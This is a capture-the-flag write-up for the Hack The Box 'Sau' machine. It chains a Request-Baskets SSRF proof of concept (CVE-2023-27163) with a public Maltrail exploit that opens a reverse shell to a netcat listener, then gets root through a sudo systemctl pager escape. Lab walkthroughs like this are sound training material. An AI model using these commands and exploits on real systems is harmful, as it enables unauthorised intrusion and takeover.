# Sau
Easy machine to Hack the Box is a popular platform for testing and improving your penetration testing skills. One of the easy labs available on the platform is the Sau HTB Lab. The Sau lab focuses on Server-Side Request Forgery (SSRF) and public exploit on Maltrail instance. sudo misconfiguration for doing privilege escalation.

<!-- toc -->

### Reconnaissance
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.
```
$ sudo nmap -p- -Pn -sV 10.129.77.100

Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 04:05 BST
Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.97% done; ETC: 04:07 (0:00:06 remaining)
Stats: 0:01:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 04:08 (0:00:17 remaining)
Stats: 0:02:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 04:08 (0:00:33 remaining)
Nmap scan report for 10.129.77.100
Host is up (0.21s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.28 seconds
```

Exploring the open port 55555 and searching online about this. We can get the exploit for Server-Side Request Forgery - Exploit POC https://github.com/entr0pie/CVE-2023-27163
```
$ wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
```
### Exploit
Updating the code and executing the script to get the access.
```
└──╼ [★]$ bash ./CVE-2023-27163.sh http://10.129.77.100:55555/ http://127.0.0.1:8338/

Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "thznpi" proxy basket...
> Basket created!
> Accessing http://10.129.77.100:55555/thznpi now makes the server request to http://127.0.0.1:8338/.
> Authorization: ecB-ULqgRVwyqJMYjqFo_Rm5yRdjT_9OVgULXrh-8NeW
```
Based on this, we got that the 55555 is powered by Maltrail (v0.53) . Teaching online, we can find working exploit - https://www.exploit-db.com/exploits/51676 which give us shell.
```
└──╼ [★]$ python3 poc.py 10.10.14.128 9001 http://10.129.77.100:55555/thznpi
Running exploit on http://10.129.77.100:55555/thznpi/login

└──╼ [★]$ nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.77.100.
Ncat: Connection from 10.129.77.100:60074.
$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma) 
```
Getting the flag:

```
$ cd /home/; ls;
$ cd puma; ls;
$ cat user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation
Getting the basic information the OS.
```
$ uname -r
5.4.0-153-generic
```
Checking the sudo access and configuration:
```
$ sudo -l
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

ran the command
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>

sudo /usr/bin/systemctl status trail.service
```
Searching online about systemctl, we can get reference to gtfobins.github.io and reading on that https://gtfobins.github.io/gtfobins/systemctl/ we will see the following approach: 
This invokes the default pager, which is likely to be less, other functions may apply.
```
$sudo systemctl
!sh
```
Using this approach, we can also start the command and gain shell access to read the flag.
```
$ sudo /usr/bin/systemctl status trail.service
!sshh!sh
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```